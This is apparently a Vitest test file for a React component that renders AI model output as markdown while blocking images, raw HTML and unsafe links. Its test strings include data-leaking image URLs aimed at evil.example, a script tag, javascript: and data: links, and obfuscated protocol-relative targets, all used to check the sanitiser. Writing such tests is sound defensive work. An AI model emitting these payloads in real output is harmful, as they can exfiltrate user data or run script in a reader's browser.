import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { AssistantMarkdown } from "@/components/assistant/assistant-markdown";

describe("AssistantMarkdown (model output is untrusted)", () => {
  it("never renders images — a remote image URL would leak data the moment it loads", () => {
    const { container } = render(
      <AssistantMarkdown
        text={"![x](https://evil.example/leak?d=secret) and <img src='https://evil.example/x'>"}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("does not render raw HTML", () => {
    const { container } = render(
      <AssistantMarkdown text={"<script>alert(1)</script><b>bold</b> ok"} />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
  });

  it("makes only http(s) and relative links clickable, hardened", () => {
    const { container } = render(
      <AssistantMarkdown
        text={
          "[web](https://example.com/a) [rel](/holdings) [js](javascript:alert(1)) [data](data:text/html,x) [proto](//evil.example)"
        }
      />,
    );
    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual([
      "https://example.com/a",
      "/holdings",
    ]);
    for (const a of links) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toContain("noopener");
      expect(a.getAttribute("rel")).toContain("noreferrer");
    }
    // The unsafe ones keep their text but are not links.
    expect(container.textContent).toContain("js");
    expect(container.textContent).toContain("proto");
  });

  it("renders GFM tables and lists", () => {
    const { container } = render(
      <AssistantMarkdown text={"| A | B |\n|---|---|\n| 1 | 2 |\n\n- one\n- two"} />,
    );
    expect(container.querySelectorAll("table th")).toHaveLength(2);
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });
  it("rejects entity-encoded protocol-relative, backslash and whitespace-led link targets", () => {
    const { container } = render(
      <AssistantMarkdown
        text={[
          "[a](/&#47;evil.example)",
          "[b](/&sol;evil.example)",
          "[c](&#47;/evil.example)",
          "[d](<\t//evil.example>)",
          "[e](<  //evil.example>)",
          "[f](/\\evil.example)",
        ].join("\n\n")}
      />,
    );
    for (const a of container.querySelectorAll("a")) {
      expect(a.getAttribute("href")).not.toMatch(/^\/\//); // never protocol-relative
      expect(a.getAttribute("href")).not.toMatch(/^\s/);
    }
  });

  it("drops reference-style images and never fetches through reference links", () => {
    const { container } = render(
      <AssistantMarkdown
        text={"![alt][ref]\n\n[click][ref]\n\n[ref]: https://evil.example/leak.png"}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("<img");
  });

  it("autolinks stay click-only and hardened", () => {
    const { container } = render(
      <AssistantMarkdown text={"see https://example.com/x and <https://example.org>"} />,
    );
    for (const a of container.querySelectorAll("a")) {
      expect(a.getAttribute("rel")).toContain("noopener");
      expect(a.getAttribute("referrerpolicy")).toBe("no-referrer");
    }
  });
});
